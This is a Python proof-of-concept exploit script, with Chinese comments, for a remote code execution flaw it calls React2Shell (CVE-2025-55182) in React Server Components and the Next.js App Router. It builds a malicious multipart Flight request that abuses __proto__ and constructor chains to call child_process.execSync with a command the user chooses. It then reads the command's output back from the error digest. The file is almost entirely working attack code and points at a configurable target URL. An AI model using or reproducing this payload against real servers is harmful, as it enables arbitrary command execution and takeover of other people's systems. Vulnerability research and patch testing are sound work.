#!/usr/bin/env python3
"""
React2Shell (CVE-2025-55182) POC — 对当前 homepage 项目（React 19.2.0 + Next.js App Router）发送恶意 Flight 请求。
"""
import argparse
import re
import sys
from urllib.parse import urlparse

import requests

BOUNDARY = "----WebKitFormBoundaryx8jO2oVc6SWP3Sad"


def build_body(cmd: str) -> tuple[bytes, str]:
    cmd_esc = cmd.replace("\\", "\\\\").replace("'", "\\'")
    # 不用 {'timeout':5000} 避免 Function() 解析时报 Unexpected token '{'
    prefix = (
        "var res=process.mainModule.require('child_process').execSync("
        f"'{cmd_esc}'"
        ").toString().trim();"
        "throw Object.assign(new Error('NEXT_REDIRECT'), {digest:res});"
    )
    part0 = (
        '{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,'
        '"value":"{\\\"then\\\":\\\"$B1337\\\"}",'
        '"_response":{'
        f'"_prefix":"{prefix}",'
        '"_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}'
    )
    body = (
        f"--{BOUNDARY}\r\n"
        f'Content-Disposition: form-data; name="0"\r\n\r\n{part0}\r\n'
        f"--{BOUNDARY}\r\n"
        f'Content-Disposition: form-data; name="1"\r\n\r\n"$@0"\r\n'
        f"--{BOUNDARY}\r\n"
        f'Content-Disposition: form-data; name="2"\r\n\r\n[]\r\n'
        f"--{BOUNDARY}--\r\n"
    ).encode("utf-8")
    return body, f"multipart/form-data; boundary={BOUNDARY}"


def main() -> None:
    ap = argparse.ArgumentParser(description="React2Shell CVE-2025-55182 POC")
    ap.add_argument("--url", default="http://localhost:3000", help="homepage 根 URL")
    ap.add_argument("--cmd", default="whoami", help="要在服务器上执行的命令")
    args = ap.parse_args()
    base_url = args.url if args.url.startswith("http") else "http://" + args.url
    # Server Action 挂在 App Router 根页面（项目首页），故 POST 到 /
    url = base_url.rstrip("/") + "/"
    body, content_type = build_body(args.cmd)
    headers = {"Next-Action": "x", "Content-Type": content_type}
    try:
        r = requests.post(url, data=body, headers=headers, timeout=45)
        text = r.text or ""
        m = re.search(r'"digest"\s*:\s*"([^"]*)"', text)
        if m:
            print(f"[+] 命令输出: {m.group(1)}")
        elif r.status_code == 500 and ("NEXT_REDIRECT" in text or "digest" in text):
            print("[+] RSC 处理已触发（500）。响应片段:", text[:400])
        else:
            print(f"[-] Status {r.status_code}. {text[:200]}")
    except requests.RequestException as e:
        print(f"[-] Error: {e}", file=sys.stderr)
        sys.exit(1)


if __name__ == "__main__":
    main()
